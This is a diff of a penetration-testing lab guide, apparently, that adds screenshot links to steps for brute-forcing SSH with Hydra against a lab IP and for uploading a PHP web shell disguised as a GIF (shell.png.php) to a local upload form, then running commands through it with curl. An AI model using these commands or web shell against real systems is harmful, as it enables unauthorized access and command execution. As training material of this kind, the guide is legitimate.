@@ -163,8 +163,9 @@ Useful wordlists:
 ### 5.2 Run Hydra (lab example target `192.168.1.117`)
 Example command (adjust target IP):
 ```bash
-hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt ssh://192.168.1.117 -t 4
+hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt ssh://192.168.1.117 -t 4
 ```
+![Hydra Input Command](screenshots/ssh-1.png)  
 
 Parameters:
 - `-L` username list  
@@ -199,19 +200,23 @@ cat > shell.png.php <<'EOF'
 GIF89a<?php system($_GET['cmd']); ?>  
 EOF
 ```
+![Create Payload File in Kali](screenshots/fileup-2.png)  
 
 (Use the above as a single command or create the file in your editor.)
 
 ### 6.3 Upload via the web form
 1. Open `http://fileupload.local/`.  
+![Image Upload Front End](screenshots/fileup-1.png)  
 2. Use the upload field to upload `shell.png.php`.  
+![Upload Image Success](screenshots/fileup-3.png)  
 3. Observe the site responds `file upload successful` (or similar).
-
+![File Uploaded Successfully Message](screenshots/fileup-6.png)  
 ### 6.4 Trigger the web shell
 Access the uploaded file with a command parameter:
 ```bash
 http://fileupload.local/Uploads/shell.png.php?cmd=id
 ```
+![URL Command Parameter](screenshots/fileup-5.png)  
 
 The response should contain output like:
 - `uid=33(www-data) gid=33(www-data)`
@@ -220,7 +225,8 @@ The response should contain output like:
 
 ### 6.5 Post-exploit notes
 - Commands run as the web server user (e.g., `www-data`).  
-- Use `curl 'http://fileupload.local/Uploads/shell.png.php?cmd=whoami'` for scripted checks.  
+- Use `curl 'http://fileupload.local/Uploads/shell.png.php?cmd=whoami'` for scripted checks.
+![Curl URL Modification Parameter](screenshots/fileup-4.png)    
 - Do not attempt privilege escalation or lateral movement beyond lab scope.
 
 ---
